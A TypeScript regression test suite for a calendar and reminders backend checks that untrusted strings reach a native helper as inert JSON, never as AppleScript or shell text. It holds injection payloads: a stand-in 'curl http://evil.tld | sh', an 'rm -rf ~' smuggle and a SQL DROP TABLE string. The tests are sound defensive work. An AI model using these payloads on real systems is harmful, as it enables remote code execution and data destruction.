/**
 * SECURITY BOTTOM LINE — injection regression suite.
 *
 * This is the anchor test for the whole project (DESIGN.md §7.3). It encodes
 * the exact class of bug that made the upstream repo exploitable: user/model
 * strings interpolated into AppleScript, where a backslash-terminated payload
 * escapes the string literal and reaches `do shell script` → arbitrary code
 * execution.
 *
 * These tests MUST stay green. A PR that makes any of them red is rejected.
 *
 * What the safe contract looks like (DESIGN.md §5.1):
 *   1. Untrusted fields cross to the native helper as STRUCTURED JSON on
 *      stdin — never concatenated into script/shell text, never in argv.
 *   2. Data is validated for shape but NOT escaped/rewritten. Escaping-based
 *      sanitization is the upstream bug class; payloads must survive intact
 *      as inert data (round-trip fidelity proves nothing was interpreted).
 *   3. The helper invocation is a fixed binary + fixed argv. No field of the
 *      payload can alter what gets executed.
 */

import { describe, it } from "node:test";
import assert from "node:assert/strict";

import {
  EVENTKIT_HELPER_BIN,
  HELPER_ARGV,
  buildHelperInvocation,
  serializeCreateEvent,
  serializeUpdateEvent,
} from "../../src/modules/calendar/backend.ts";
import {
  serializeCreateReminder,
  serializeListReminders,
} from "../../src/modules/reminders/backend.ts";

/** Payloads that broke naive `"` -> `\"` escaping in the upstream repo.
 *  (Written with explicit \\ escapes — String.raw`...\` does not end where it
 *  looks like it does, because \` escapes the closing backtick.) */
const MALICIOUS_INPUTS = [
  // backslash-terminated: closes the literal, rest becomes AppleScript
  "Meeting\\",
  'Sync\\" & (do shell script "curl http://evil.tld | sh") & \\"',
  // AppleScript command smuggling
  `x" & (do shell script "rm -rf ~") & "`,
  // newline / statement break attempts
  'line1\nset x to (do shell script "whoami")',
  // SQL metacharacters (for the messages/sqlite path, M4)
  `'; DROP TABLE message; --`,
  // null / control chars
  "evil\u0000payload",
];

/** Key names that would indicate script text is being built somewhere. */
const FORBIDDEN_KEYS = /^(script|applescript|osascript|command|cmd|shell|sh|source|code)$/i;

function forEachKey(value: unknown, fn: (key: string) => void): void {
  if (Array.isArray(value)) return value.forEach((v) => forEachKey(v, fn));
  if (value !== null && typeof value === "object") {
    for (const [k, v] of Object.entries(value as Record<string, unknown>)) {
      fn(k);
      forEachKey(v, fn);
    }
  }
}

describe("untrusted data never reaches executable script/shell text", () => {
  for (const payload of MALICIOUS_INPUTS) {
    const label = JSON.stringify(payload).slice(0, 48);

    it(`carries payload as inert structured data: ${label}…`, () => {
      const request = serializeCreateEvent({
        title: payload,
        start: "2026-01-01T10:00:00Z",
        end: "2026-01-01T11:00:00Z",
      });

      // 1) Output is structured data, not a string of script text.
      assert.equal(typeof request, "object");
      assert.equal(request.op, "calendar.create_event");

      // 2) No field carries executable script text (by name).
      forEachKey(request, (key) => {
        assert.ok(!FORBIDDEN_KEYS.test(key), `forbidden script-like field "${key}"`);
      });

      // 3) Round-trip fidelity: the payload survives EXACTLY as data.
      //    (If some layer had "escaped" or rewritten it, that layer would be
      //    interpreting untrusted content — the upstream bug class.)
      const wire = JSON.parse(buildHelperInvocation(request).stdin) as typeof request;
      assert.equal(wire.args.title, payload);
    });

    it(`keeps the helper invocation fixed: ${label}…`, () => {
      const invocation = buildHelperInvocation(
        serializeCreateEvent({
          title: payload,
          start: "2026-01-01T10:00:00Z",
          end: "2026-01-01T11:00:00Z",
        }),
      );

      // 4) Fixed binary, fixed argv — payload only ever on stdin.
      assert.equal(invocation.command, EVENTKIT_HELPER_BIN);
      assert.deepEqual([...invocation.argv], [...HELPER_ARGV]);
      for (const arg of invocation.argv) {
        assert.ok(!arg.includes(payload), "payload leaked into argv");
      }
      assert.ok(!invocation.command.includes(payload), "payload leaked into command");
    });
  }

  it("rejects structurally invalid input (shape validation, not escaping)", () => {
    assert.throws(() =>
      serializeCreateEvent({ title: "ok", start: "not-a-date", end: "also-not" }),
    );
    assert.throws(() => serializeCreateEvent({ title: "", start: "2026-01-01T10:00:00Z", end: "2026-01-01T11:00:00Z" }));
    assert.throws(() => serializeCreateEvent(null));
  });
});

describe("all serializer boundaries carry payloads as inert data", () => {
  const START = "2026-01-01T10:00:00Z";
  const END = "2026-01-01T11:00:00Z";

  for (const payload of MALICIOUS_INPUTS) {
    const label = JSON.stringify(payload).slice(0, 40);

    it(`update_event notes: ${label}…`, () => {
      const req = serializeUpdateEvent({ id: "evt-1", notes: payload });
      assert.equal(req.op, "calendar.update_event");
      assert.equal(JSON.parse(JSON.stringify(req)).args.notes, payload);
      forEachKey(req, (k) => assert.ok(!FORBIDDEN_KEYS.test(k)));
    });

    it(`create_reminder title+notes: ${label}…`, () => {
      const req = serializeCreateReminder({ title: payload, notes: payload, due: START });
      assert.equal(req.op, "reminders.create");
      const wire = JSON.parse(JSON.stringify(req)) as typeof req;
      assert.equal(wire.args["title"], payload);
      assert.equal(wire.args["notes"], payload);
      forEachKey(req, (k) => assert.ok(!FORBIDDEN_KEYS.test(k)));
    });
  }

  it("list inputs validate shape without rewriting content", () => {
    assert.throws(() => serializeListReminders({ limit: 10_000 }));
    const req = serializeCreateEvent({ title: "ok", start: START, end: END });
    assert.equal(req.args["title"], "ok");
  });
});
